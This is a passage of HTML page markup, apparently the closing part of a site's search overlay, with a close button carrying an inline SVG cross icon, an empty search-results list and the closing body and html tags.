        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
  
</html>
